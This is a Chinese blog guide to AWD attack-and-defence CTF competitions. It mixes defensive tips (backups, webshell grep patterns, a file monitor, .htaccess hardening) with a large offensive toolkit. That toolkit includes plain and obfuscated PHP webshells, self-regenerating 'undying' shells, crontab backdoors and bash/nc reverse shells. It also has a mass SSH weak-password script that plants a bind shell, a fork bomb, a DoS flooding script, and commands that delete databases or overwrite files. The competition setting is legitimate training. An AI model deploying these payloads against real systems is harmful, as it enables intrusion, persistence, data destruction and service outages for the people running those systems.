---
title: 浅谈AWD攻防赛的生存攻略
date: 2024-09-25 14:30:33
updated: 2024-11-15 21:49:39
categories:
  - 网络安全
  - AWD
tags:
  - AWD
  - 网络安全
permalink: /posts/浅谈AWD攻防赛的生存攻略/
---
浅谈AWD攻防赛的生存攻略

------

# AWD 规则

AWD：Attack With Defence，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三台，视小组参赛人数而定），服务器中存在多个漏洞（web层、系统层、中间件层等），利用漏洞攻击其他队伍可以进行得分，加固时间段可自行发现漏洞对服务器进行加固，避免被其他队伍攻击失分。

- 1.一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；

- 2.可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析（较少提供）；

- 3.flag在主办方的设定下每隔一定时间刷新一轮；

- 4.各队一般都有一个初始分数；

- 5.flag一旦被其他队伍拿走，该队扣除一定积分；

- 6.得到flag的队伍加分；

- 7.一般每个队伍会给一个低权限用户，非root权限；

- 8.主办方会对每个队伍的服务进行check，服务器宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分。

  \# 前期准备

  \## SSH登录

  口令登录

  命令格式为： ssh 客户端用户名@服务器ip地址

  ```
  ssh 用户名@ip
  ssh ctf@192.168.182.130
  ```

  如果不是默认的22端口，也可以使用 -p 选项来修改端口号，比如连接到服务器的2222端口

  ```
  ssh -p 指定端口号 用户名@ip
  ssh -p 2222 ctf@192.168.182.130
  ```

  除此之外还可以使用Finalshell或者Xshell等图形化服务器管理软件

**密钥登录**
用id_rsa用于登陆靶机，命令如下

```
sftp -i id_rsa ctf@192.168.182.130
```

## 改密码

官方在给出服务器密码时，很有可能是默认的，那就需要赶快修改自己的密码，但一般主办方给的是随机密码。

如果发现每个队伍的SSH账号密码都是一样的，需要立即修改口令，如果被其他队伍改了那就gg了，同时要准备好批量脚本，一旦是默认密码，可以直接利用。

SSH密码修改:

```
passwd
```

mysql密码修改:

```
#方法一
show databases;
use mysql
set password for root@localhost = password('123');
#方法二
update user set password = PASSWORD('需要更换的密码') where user='root';
flush privileges;
show tables;
```

Web后台很有可能存在弱口令，需要立即修改，也可以修改其他队伍的后台口令，为本队所用，说不定可以利用后台getshell。

## 备份源码

比赛开始后第一时间备份服务器中web目录下的文件(/var/www/html)，备份的目的在于万一对方利用漏洞进入你的靶机将你的WWW下的目录给删除了，可以及时恢复，如果你没有备份就相当于宕机了

比赛开始第一时间备份，备份网站目录及数据库，一般在 /var/www/html 目录。

1.目录打包

```
打包
tar -zcvf archive_name.tar.gz  directory_to_compress
注意：如果使用tar命令打包文件夹，.index.php（隐藏类型文件）将不会被打包

备份整站
cd /var/www && tar -czvf /tmp/html.tgz html
# 软连接到了/app
cd / && tar -czvf /tmp/app.tgz app

解包
tar -zxvf archive_name.tar.gz
```

2.备份数据库

- 备份指定的多个数据库

```
mysqldump -uroot -proot --databases DB1 DB2 > /tmp/db.sql
```

无 lock tables 权限的解决方法

```
mysqldump -uroot -proot --all-databases --skip-lock-tables > /tmp/db.sql
```

- 恢复备份（在 MySQL 终端下执行）

```
source FILE_PATH
```

- 重置 MySQL 密码（在 MySQL 终端下执行）

方法 1

```
set password for 用户名@localhost = password("新密码")
```

方法 2

```
mysqladmin -u用户名 -p旧密码 password 新密码
```

3.下载到本地

```
scp -P ssh_port user@host_ip:/tmp/bak.sql local_file
```

## 查找预留后门

用D盾扫描备份的文件，查找预留后门，第一时间删除自己靶机上的后门，也可以利用后门攻击其他靶机。

可以使用 seay进行代码审计

## 端口扫描

端口扫描是信息收集的一部分，需要知道目标服务器开放了哪些端口，使用端口扫描工具有御剑高速TCP全端口扫描工具、nmap和masscan等进行扫描。
所有服务器配置都是一样的，也可以看己方靶机开放了哪些端口。

以下是一些服务端口的漏洞：
22：ssh弱口令
873：未授权访问漏洞
3306：mysql弱口令
6379：redis未授权访问漏洞

# 攻击思路

## 主机发现

信息收集

- nmap、Routescan
- Python 脚本

```
import requests
for x in range(2,255): 
    url = "http://192.168.1.{}".format(x) 
    try: 
        r = requests.post(url) 
        print(url) 
        except: 
        pass
```

## 后门利用

curl读flag

```
C:\Users\admin>curl "http://192.168.182.130:8801/include/shell.php" -d "admin_ccmd=system('cat /f*');"
SL{4a0be463dd85555090f2216795677916d2447242}
flag{glzjin_wants_a_girl_friend}
```

脚本

```
端口
#coding=utf-8
import requests
url_head="http://192.168.182.130"   #网段
url=""
shell_addr="/upload/url/shell.php" #木马路径
passwd="pass"                   #木马密码
#port="80"
payload = {passwd: 'System(\'cat /flag\');'}
# find / -name "flag*"

#清空上次记录
flag=open("flag.txt","w")
flag.close()

flag=open("flag.txt","a")


for i in range(8000,8004):
    url=url_head+":"+str(i)+shell_addr
    try:
        res=requests.post(url,payload)#,timeout=1
        if res.status_code == requests.codes.ok:
            result = res.text
            print (result)
            flag.write(result+"\n") 
        else:
            print ("shell 404")
    except:
        print (url+" connect shell fail")

flag.close()
```

## 一句话木马

常用语言的一句话木马

```
php： <?php @eval($_POST['pass']);?>      <?php eval($_GET['pass']);
asp：   <%eval request ("pass")%>
aspx：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
```

蚁剑连接get型木马，之前一直不会用蚁剑连接get型木马，这里记录一下。

```
<?php eval($_GET['pass']);

/shell.php?pass=eval($_POST[1]);
连接密码：1
```

## 隐藏shell

shell很容易被发现，被删除就gg了，可以采用一些操作隐藏shell或使shell无法被删除

**1.把shell.php命名为.shell.php**

.shell.php在执行ls时无法被查看到，搭配ls的参数才能被发现
完整命令如下

```
[sss@ecs-centos-7 awd]$ echo "iamshell">shell.php
[sss@ecs-centos-7 awd]$ ls
shell.php
[sss@ecs-centos-7 awd]$ mv shell.php .shell.php
[sss@ecs-centos-7 awd]$ ls
[sss@ecs-centos-7 awd]$ ls -al
总用量 12
drwxrwxr-x 2 sss sss 4096 12月  29 22:52 .
drwx------ 4 sss sss 4096 12月  29 22:51 ..
-rw-rw-r-- 1 sss sss    9 12月  29 22:52 .shell.php
```

**2.把shell.php命名为-shell.php**
从上面可以看出，ls加参数才能查看到shell，那么我们直接写一个-shell.php、
命令行会把-后面的内容当成参数执行，执行即使被发现，使用rm命令进行删除，会被当成是rm的参数，就会发生报错，无法删除shell，目的也达到了

完整命令如下

```
[sss@ecs-centos-7 awd]$ ls
-shell.php
[sss@ecs-centos-7 awd]$ rm -shell.php 
rm：无效选项 -- s
Try 'rm ./-shell.php' to remove the file "-shell.php".
Try 'rm --help' for more information.
[sss@ecs-centos-7 awd]$ rm -rf -shell.php 
rm：无效选项 -- s
Try 'rm ./-shell.php' to remove the file "-shell.php".
Try 'rm --help' for more information.
```



## 特殊的shell

shell1：

```
<?php ($_=@$_GET[2]).@$_($_POST[1])?>
```

连接方式：php?2=assert密码是1。

shell2：

```
<?php
$a=chr( 96^5);
$b=chr( 57^79);
$c=chr( 15^110);
$d=chr( 58^86);
$e= '($_REQUEST[C])';
@assert($a.$b.$c.$d.$e);
?>
```

配置为?b=))99(rhC(tseuqeR+lave

shell3：

```
<?php
$sF= "PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n985de9'];if(isset($s22)){eval($s21($s22));}
?>
```

配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=
连接密码:0（零）

shell4：MD5木马

```
<?php
if(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253')
@eval($_POST['cmd']);
?>
```

shell5：MD5木马+利用header
2021ISCC河南赛区线下赛就是这种shell，当时差点没看出来

```
<?php
echo 'hello';
if(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253')
if (@$_SERVER['HTTP_USER_AGENT'] == 'flag'){
$test= 'flag';
header("flag:$test");
}
?>
```

## 不死马

不死马示例：

```
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = 'shell.php';
$code = '<?php if(md5($_POST["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST['cmd']);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" shell2.php');
    usleep(5000);
}
?>

#passwd=y0range857
#POST传参：passwd=y0range857&a=system('ls');
```

将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件，然后使用caidao输入http://xxx/shell2.php?pass=pass的路径，密码为a就可以链接一句话，由于pass是md5加密很难被破解也可以做到隐蔽,md5值可以随意定义。

写入shell， at.php内容

```
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.login.php';
$file1 = '/admin/.register.php'; 
$code = '<?php if(md5($_GET["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST["at"]);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" .login.php');
    file_put_contents($file1,$code);
    system('touch -m -d "2018-12-01 09:10:12" /admin/.register.php');
    usleep(5000);
}
?>
```

浏览器访问at.php，会生成不死马at2.php

```
url/upload/at.php
```

再传入，执行命令，getshell

```
url/upload/at2.php?passwd=obse007&at=system('ls');
```

## 权限维持

预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少，未雨绸缪。
**crontab定时任务**
1.使用定时任务写马

```
system('echo "* * * * * echo \"<?php  if(md5(\\\\\\\\\$_POST[pass])==\'462d4a0e7cedd6b024a4d99f10c614d1\'){@eval(\\\\\\\\\$_POST[1]);}  \" > /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php" | crontab;whoami');
```

密码：atkx
来指定用户运行指定的定时任务

2.使用定时任务发送带有flag的请求

```
bash# 编辑 crontab：crontab -e
*/5 * * * * curl 10.10.10.5:8000/submit_flag/ -d 'flag='$(cat /home/web/flag/flag)'&token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY'
# 查询 crontab：crontab -l
```

3.使用定时任务反弹shell

```
bash -c bash'bash -i >& /dev/tcp/[ip]/[port] 0>&1'

nc -e /bin/bash 1.3.3.7 4444 bash
```

**反弹shell**
nc反弹shell

```
bash -i >& /dev/tcp/192.168.182.130/6666 0>&1
```

本地

```
nc -l -p 6666
```

## 软链接

软连接语法：

```
ln -s  [shell路径]   [新文件路径]
```

使用方法：
访问/upload/new.php，实际上是访问/upload/shell.php

```
ln -s  /var/www/html/upload/shell.php     /var/www/html/upload/new.php
```

软连接利用

```
root@086f12c38b93:~# ln -s /flag /var/www/html/css/flag.css
root@086f12c38b93:~# cat /var/www/html/css/flag.css
SL{3c7c719b9fb980dca71080b9d96c9c6aa03c16c0}
```

然后访问url/css/flag.css即可得到flag

## SSH弱密码利用

```
#-*- coding:utf-8 -*-
import paramiko
ip = '192.168.1.137'
port = '22'
username = 'root'
passwd = '123456'
# ssh 用户名 密码 登陆
def ssh_base_pwd(ip,port,username,passwd,cmd='cat /flag'):
    port = int(port)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip, port=port, username=username, password=passwd)
    stdin,stdout,stderr = ssh.exec_command(cmd)
    result = stdout.read()
    if not result :
        print("无结果!")
        result = stderr.read()
    ssh.close()
    return result.decode()
a = ssh_base_pwd(ip,port,username,passwd)
print(a)

#SL{3c7c719b9fb980dca71080b9d96c9c6aa03c16c0}
```

批量

```
#-*- coding:utf-8 -*-
import paramiko
import threading
import queue
import time
#反弹shell python
q=queue.Queue()
#lock = threading.Lock()

# ssh 用户名 密码 登陆
def ssh_base_pwd(ip,port,username,passwd,cmd):
    port = int(port)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip, port=port, username=username, password=passwd)
    stdin,stdout,stderr = ssh.exec_command(cmd)
    result = stdout.read()
    if not result :
        result = stderr.read()
    ssh.close()
    return result.decode()

def main(x):
    shell = '''
    #服务器端
    import socket
    import os
    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(('0.0.0.0',1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接
    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量
    con,addr=s.accept()     #接受一个客户端的连接
    #print(con,addr)
    for i in range(10):
        cmd=con.recv(1024)
        print(cmd)
        command=cmd.decode()
        if command.startswith('cd'):
            os.chdir(command[2:].strip())   #切换路径
            result=os.getcwd()      #显示路径
        else:
            result=os.popen(command).read()
        if result:
            con.send(result.encode())
        else:
            con.send(b'OK!')
    '''
    cmd = 'echo \"%s\" > ./shell.py' % (shell) +'&& python3 ./shell.py'
    port = '22'
    username = 'root'
    passwd = 'toor'

    ip = '192.168.1.{}'.format(x)
    q.put(ip.strip(),block=True, timeout=None)
    ip_demo=q.get()
    #判断是否成功
    try:
        #lock.acquire()
        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd='id')
        if res:
            print("[ + ]Ip: %s" % ip_demo +" is success!!! [ + ]")
            #lock.release()
            ssh_base_pwd(ip_demo,port,username,passwd,cmd)
    except:
        print("[ - ]Ip: %s" % ip_demo +" is Failed")
    if x > 255:
        print("Finshed!!!!!!!!")
    q.task_done()

#线程队列部分
th=[]
th_num=255
for x in range(th_num):
        t=threading.Thread(target=main,args=(x,))
        th.append(t)
for x in range(th_num):
        th[x].start()
for x in range(th_num):
        th[x].join()

#q.join()所有任务完成
```

## 

## 攻击搅屎

无限复制

```
<?php
  set_time_limit(0);
  ignore_user_abort(true);
  while(1){
      file_put_contents(randstr().'.php',file_get_content(__FILE__));
      file_get_contents("http://127.0.0.1/");
  }
?>
```

修改数据库密码

```
update mysql.user set authentication_string=PASSWORD('p4rr0t');# 修改所有用户密码
flush privileges;
UPDATE mysql.user SET User='aaaaaaaaaaaa' WHERE user='root'; 
flush privileges;
delete from mysql.user ;#删除所有用户
flush privileges;
```

重启 apache2 和 nigix

```
#!/usr/bin/env sh
while [[ 1 ]]
do
    service apache2 stop
    service nginx stop
done &
```

循环删除

```
<?php
    set_time_limit(0);
    ignore_user_abort(1);
    unlink(__FILE__);
    function getfiles($path){
        foreach(glob($path) as $afile){
            if(is_dir($afile))
                getfiles($afile.'/*.php');
            else
                @file_put_contents($afile,"#Anything#");
                //unlink($afile);
        }
    }
    while(1){
        getfiles(__DIR__);
        sleep(10);
    }
?>

<?php
    set_time_limit(0);
    ignore_user_abort(1);
    array_map('unlink', glob("some/dir/*.php"));
?>
```

删除数据库

```
#!/usr/bin/env python3
  import base64
  def rm_db(db_user,my_db_passwd):
      cmd = "/usr/bin/mysql -h localhost -u%s %s -e '"%(db_user,my_db_passwd)
      db_name = ['performance_schema','mysql','flag']
      for db in db_name:
          cmd += "drop database %s;"%db
      cmd += "'"
      return cmd
```

fork_bomb

```
#!/bin/sh
/bin/echo '.() { .|.& } && .' > /tmp/aaa;/bin/bash /tmp/aaa;
```

DOS脚本（非必要最好不要用）

```
import socket
import time
import threading

max=90000000
port=80                 #端口
host="192.168.92.154"   #IP
page="/index.php"

bag=("POST %s HTTP/1.1\r\n"
    "host: %s\r\n"
    "Content-Length: 1000000000\r\n"
    "Cookie: 1998\r\n"
    "\r\n" % (page,host))

socks = []

def connect():
    global socks
    for i in range(0,max):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((host,port))
            s.send(bag.encode("utf-8"))
            socks.append(s)
        except Exception as ex:
            time.sleep(1)

def send():
    global socks
    while True:
        for s in socks:
            try:
                print("攻击中....")
            except Exception as ex:
                socks.remove(s)
                s.close()
        time.sleep(0.1)

One = threading.Thread(target=connect,args=())
Two = threading.Thread(target=send,args=())
One.start()
Two.start()
```

# 防守思路

## 基础查杀

寻找最近20分钟修改过的文件

```
find /var/www/html -name *.php -mmin -20
```

寻找行数最短的文件：

```
find ./ -name '*.php' | xargs wc -l | sort -u
```

关键字查杀

```
find . -name '*.php' | xargs grep -n 'eval('
find . -name '*.php' | xargs grep -n 'assert'
find . -name '*.php' | xargs grep -n 'system()'
```

查找命令执行函数

```
find /var/www/html -name "*.php" |xargs egrep 'assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\('
```

## 文件监控

脚本

```
# -*- coding: utf-8 -*-
#use: python file_check.py ./

import os
import hashlib
import shutil
import ntpath
import time

CWD = os.getcwd()
FILE_MD5_DICT = {}      # 文件MD5字典
ORIGIN_FILE_LIST = []

# 特殊文件路径字符串
Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'
bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'
logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'

Special_string = 'drops_log'  # 免死金牌
UNICODE_ENCODING = "utf-8"
INVALID_UNICODE_CHAR_FORMAT = r"\?%02x"

# 文件路径字典
spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
Special_path = {
    'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)),
    'log' : os.path.realpath(os.path.join(spec_base_path, logstring)),
    'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
    'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),
}

def isListLike(value):
    return isinstance(value, (list, tuple, set))

# 获取Unicode编码
def getUnicode(value, encoding=None, noneToNull=False):

    if noneToNull and value is None:
        return NULL

    if isListLike(value):
        value = list(getUnicode(_, encoding, noneToNull) for _ in value)
        return value

    if isinstance(value, unicode):
        return value
    elif isinstance(value, basestring):
        while True:
            try:
                return unicode(value, encoding or UNICODE_ENCODING)
            except UnicodeDecodeError, ex:
                try:
                    return unicode(value, UNICODE_ENCODING)
                except:
                    value = value[:ex.start] + "".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
    else:
        try:
            return unicode(value)
        except UnicodeDecodeError:
            return unicode(str(value), errors="ignore")

# 目录创建
def mkdir_p(path):
    import errno
    try:
        os.makedirs(path)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else: raise

# 获取当前所有文件路径
def getfilelist(cwd):
    filelist = []
    for root,subdirs, files in os.walk(cwd):
        for filepath in files:
            originalfile = os.path.join(root, filepath)
            if Special_path_str not in originalfile:
                filelist.append(originalfile)
    return filelist

# 计算机文件MD5值
def calcMD5(filepath):
    try:
        with open(filepath,'rb') as f:
            md5obj = hashlib.md5()
            md5obj.update(f.read())
            hash = md5obj.hexdigest()
            return hash
    except Exception, e:
        print u'[!] getmd5_error : ' + getUnicode(filepath)
        print getUnicode(e)
        try:
            ORIGIN_FILE_LIST.remove(filepath)
            FILE_MD5_DICT.pop(filepath, None)
        except KeyError, e:
            pass

# 获取所有文件MD5
def getfilemd5dict(filelist = []):
    filemd5dict = {}
    for ori_file in filelist:
        if Special_path_str not in ori_file:
            md5 = calcMD5(os.path.realpath(ori_file))
            if md5:
                filemd5dict[ori_file] = md5
    return filemd5dict

# 备份所有文件
def backup_file(filelist=[]):
    # if len(os.listdir(Special_path['bak'])) == 0:
    for filepath in filelist:
        if Special_path_str not in filepath:
            shutil.copy2(filepath, Special_path['bak'])

if __name__ == '__main__':
    print u'---------start------------'
    for value in Special_path:
        mkdir_p(Special_path[value])
    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
    ORIGIN_FILE_LIST = getfilelist(CWD)
    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
    print u'[*] pre work end!'
    while True:
        file_list = getfilelist(CWD)
        # 移除新上传文件
        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
        if len(diff_file_list) != 0:
            # import pdb;pdb.set_trace()
            for filepath in diff_file_list:
                try:
                    f = open(filepath, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] webshell find : ' + getUnicode(filepath)
                        shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt'))
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filepath)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : file move error: ' + getUnicode(e)

        # 防止任意文件被修改,还原被修改文件
        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
        for filekey in md5_dict:
            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
                try:
                    f = open(filekey, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] file had be change : ' + getUnicode(filekey)
                        shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt'))
                        shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey)
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filekey)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : done_diff: ' + getUnicode(filekey)
                        pass
        time.sleep(2)
        # print '[*] ' + getUnicode(time.ctime())
```

运行

```
python jiankong.py  /var/www/html
```

## alias起别名

```
alias cat="echo nothing"
```

删除

```
unalias -a
```

对方执行cat /flag命令的时候回显就是错误flag

```
alias cat="echo `date`|md5sum|cut -d ' ' -f1||"
```

获取 flag 一般是 curl http://xxx.com/flag.txt

```
alias curl='echo fuckoff' #权限要求较低，可以在这里改成虚假的flag
# 或者
chmod -x curl #权限要求较高
/usr/bin curl路径
```

## 杀不死马

查看进程

```
root@1177499f5b23:~# ps aux | grep www-data
www-data  4819  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  6663  0.0  0.6 316188 13460 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  6675  0.0  0.3 315620  6976 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  6690  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  6693  0.0  0.4 315800  9056 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  7170  0.0  0.6 316312 14100 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  7239  0.0  0.6 316172 14020 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  7526  0.0  0.4 315620  8364 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data  8380  0.0  0.6 316188 12612 ?        S    Dec16   0:00 apache2 -D FOREGROUND
www-data 22554  0.0  0.3 315564  7416 ?        S    03:10   0:00 apache2 -D FOREGROUND
root     25353  0.0  0.0   8868  1544 pts/1    S+   05:25   0:00 grep --color=auto www-data
```

(1)杀进程

```
kill -9 对应的进程号
```

执行命令

```
ps aux | grep www-data | awk '{print $2}' | xargs kill -9
ps aux | grep www-data | grep -v grep | awk '{print $2}' | xargs kill -9
```

原理

```
ps aux
列出进程信息

grep www-data
在进程信息中找到需要杀死的进程

grep -v grep
在进程信息中剔除带grep的信息

awk ‘{print $2}’
提取字符串行内容的第2个字段，也就是当前示例的进程号

xargs kill -9
将进程号作为参数传递给kill -9这个命令
```

然后删除不死马文件

(2)重启php等web服务，不推荐使用

```
service php-fpm restart
```

(3)用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。

```
<?php
while (1) {
    $pid=1234;  #不死马进程
    @unlink('demo.php');
    exec('kill -9 $pid');
}
?>

<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.3.php';
    $code = 'hi springbird !';
    //pass=pass
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .3.php');
    //    usleep(5000);
          usleep(1000);
    }
?>
```

(4)创建一个和不死马生成的马一样名字的文件夹 mkdir 1.php
循环创建

```
#!/bin/bash
dire="/var/www/html/.base.php/"
file="/var/www/html/.base.php"
rm -rf $file
mkdir $dire
./xx.sh
```

## 清除反弹shell

查看进程

```
ps -ef / px -aux
```

出现www-data权限的/bin/sh一般为nc

然后杀进程

```
kill `ps -aux | grep www-data | grep apache2 | awk '{print $2}'`
```

## 提权

在AWD中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。

关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。

影响范围比较大的漏洞，可以用来提权：

```
CVE-2017-6074 (DCCP双重释放漏洞 > 2.6.18 ) ：
DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务(系统崩溃)或者提升权限，获得系统的管理访问权限

CVE-2016-5195(脏牛，kernel 2.6.22 < 3.9 (x86/x64)) ：
低权限用户可修改root用户创建的文件内容，如修改 /etc/passwd，把当前用户的 uid 改成 0 即可提升为root权限

CVE-2016-8655(Ubuntu 12.04、14.04，Debian 7、8) ：
条件竞争漏洞，可以让低权限的进程获得内核代码执行权限
POC：https://www.seebug.org/vuldb/ssvid-92567

CVE-2017-1000367(sudo本地提权漏洞 ) ：L
inux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。

CVE-2016-1247(Nginx权限提升漏洞) ：
Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。
POC：https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
```

## 漏洞修复

基本原则

- 能修复的尽量修复；
- 不能修复的先注释源码，不影响页面显示再删除；
- 站点和对应的功能尽可能不宕机；

技巧

- 设置 waf，如 load_file；
- 对于一些成型的 CMS，找到相应版本号后，对其 diff；
- 修改弱口令用户；
- 对于觉得危险函数的地方直接使用die()；

比如文件上传漏洞修复，可以在upload目录下写.htaccess禁止php文件执行

```
<Directory "/var/www/html/upload">
Options -ExecCGI -Indexes
AllowOverride None
RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
php_flag engine off
<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
deny from all
</FilesMatch>
</Directory>
```

一些修复技巧参考：https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/

## 日志分析

命令行动态查看日志

```
tailf /var/log/apache2/access.log
```

还可以使用工具进行日志分析：[LogForensics 腾讯实验室 /web日志取证分析工具](https://security.tencent.com/index.php/opensource/detail/15)

日志的存放地址

```
/var/log/apache2/
/usr/local/apache2/logs
/usr/nginx/logs/
```

为了对其他防守方进行干扰，可以利用脚本发生大量垃圾数据包，混淆视觉，给对方人员增加检测的难度，浪费对方的时间。

```
import requests
import time

def scan_attack():
    file={'shell.php','admin.php','web.php','login.php','1.php','index.php'}
    payload={'cat /flag','ls -al','rm -f','echo 1','echo 1 /proc/sys/net/ipv4/ip_forward','rm -rf / --no-preserve-root'}
    while(1):
        for i in range(1, 50):
            for ii in file:
                url='http://192.168.182.'+ str(i)+'/'+ii
                print(url)
                for iii in payload:
                    data={
                        'payload':iii
                    }
                    try:
                        requests.post(url,data=data)
                        print("正在搅屎:"+str(i)+'|'+ii+'|'+iii)
                        time.sleep(0.1)
                    except Exception as e:
                        time.sleep(0.1)
                        pass


if __name__ == '__main__':
    scan_attack()
```

## 流量分析

在比赛服务器上抓取流量包，需要的权限比较高，一般比赛用不到

```
sudo tcpdump -s 0 -w flow.pcap port 80
# 然后使用 scp 写个脚本实时将流量包拷贝到本地


tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap
命令拆解分析：
1、tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型
2、-i eth1 : 只抓经过接口eth1的包
3、-t : 不显示时间戳
4、-s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包
5、-c 100 : 只抓取100个数据包
6、dst port ! 22 : 不抓取目标端口是22的数据包
7、src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24
8、-w ./target.cap : 保存成cap文件，方便用wireshark分析
```

PHP版流量监控

```
<?php

  date_default_timezone_set('Asia/Shanghai');

$ip = $_SERVER["REMOTE_ADDR"]; //记录访问者的ip

$filename = $_SERVER['PHP_SELF']; //访问者要访问的文件名

$parameter = $_SERVER["QUERY_STRING"]; //访问者要请求的参数

$time = date('Y-m-d H:i:s',time()); //访问时间

$logadd = '来访时间：'.$time.'-->'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter."\r\n";

// log记录

$fh = fopen("log.txt", "a");

fwrite($fh, $logadd);

fclose($fh);

?>
```

一个针对php的web流量抓取、分析的应用：[wupco](https://github.com/wupco)/[weblogger](https://github.com/wupco/weblogger)
使用方法

```
